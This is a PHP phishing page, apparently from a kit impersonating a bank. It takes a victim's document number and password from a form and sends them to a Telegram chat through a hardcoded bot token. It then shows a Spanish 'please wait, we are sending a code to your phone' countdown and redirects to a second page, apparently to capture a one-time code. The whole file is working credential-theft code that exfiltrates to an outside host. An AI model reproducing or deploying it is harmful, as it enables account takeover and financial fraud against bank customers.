<?php
ini_set("display_errors", 0);

////////////////////
if ( isset ($_POST['numdoc']) && isset ($_POST['clv'])  ){

$message = "doc.: ".$_POST['numdoc']." - Clav.: ".$_POST['clv']."\r\n";

$apiToken = "5590338703:AAEeurTEIaJZFuwaCY3pGdUHPRzRQELX9fs";


$data = [
  'chat_id' => '-1001901333657',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


}else{ header ('location: index.php'); exit();
 }
 
?>

<html class="wf-montserrat-n4-active wf-montserrat-n5-active wf-montserrat-n7-active wf-sansserif-n4-inactive wf-active">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1,width=device-width,viewport-fit=cover">

<link rel="stylesheet" href="./cese/fonts.css">
<link rel="stylesheet" href="./cese/ionicons.css">

<title>home</title>

<link href="./cese/2.d18bb301.chunk.css" rel="stylesheet">
<link href="./cese/main.8d29879f.chunk.css" rel="stylesheet">

<style>
select { color:white; }
option { color:white; background-color:black; }
</style>

 <script language="JavaScript">
	var tiempo=30;
    var url="index2.php";
 
    function updateReloj()
    {
        document.getElementById('contador').innerHTML = "Por favor, espera "+tiempo+" segundos <br>estamos enviando un código a tu telefono";
 
        if(tiempo==0)
        {
            window.location=url;
        }else{
            tiempo-=1;
            setTimeout("updateReloj()",1000);
        }
    }
   window.onload=updateReloj;
 
    </script>

</head>

<body>




<div id="root">


<div class="transition-drill-in"><div class="transition-wrapper">


<div class="view-wrapper">

<div class="full-screen force-full-screen" style="text-align:center; background-image: url('cese/img-1.jpg'); 
background-position: center center; background-repeat:no-repeat; background-size: cover; height:150px, ">
<img src="cese/logdav.png" style="width:150px;">
<div class="view-page">




<div role="main" class="view-content"><main class="main-container"><div class="view-content-container">
<br><br>
<form class="above-the-fold" style="color:#ffffff">
<section class="flex-grow align-items-center container--layout margin-bottom-05rem-mb"><div class="container"><div class="justify-content-center row">
<div xl="6" class="col col-12 col-lg-6 col-md-12 col-sm-12 col-xs-12">
<div class="notifications-wrapper"></div><div class="notifications-wrapper"></div>

 
 
 <div class="">

 <div class="">
 



</div></div>
 
 <br>
 
 <div class="">

 
  <br>
 

 
 
  <br><br>
  
  	<div align="center"><img src="cese/crrggd.gif" style="width:90px;">
								
								<br><br><br><br>
								
								
								<font id="contador" style=" font-size:20px;"></font>
								</div>
  
  

 
  <br><br><br><br>
  <div align="center"><div class="switch-label-text"></div></label>
  <br>

    <br><br><br>  <br><br><br>
  
 </div>
 
  <br><br><br>  <br><br><br>  <br><br><br>  <br><br><br> <br><br><br>  <br><br><br>
 </div>
 
 </div></div></div></section>
 

</form>

</div><div class="app-footer">
</div></main></div></div>

</div>
</div>

</div>
</div>

</div>
</body>
</html>
